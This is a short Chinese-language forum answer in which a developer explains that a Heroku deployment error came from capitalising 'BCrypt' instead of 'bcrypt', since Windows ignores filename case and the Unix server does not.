只需发布此答案以帮助其他人找到此页面。正确答案在@eugen 对问题的评论中。

问题是大写，因为我在 Windows 上开发，它不关心大小写，但在 Heroku (UNIX) 服务器上它确实如此，我应该使用“bcrypt”而不是“BCrypt”。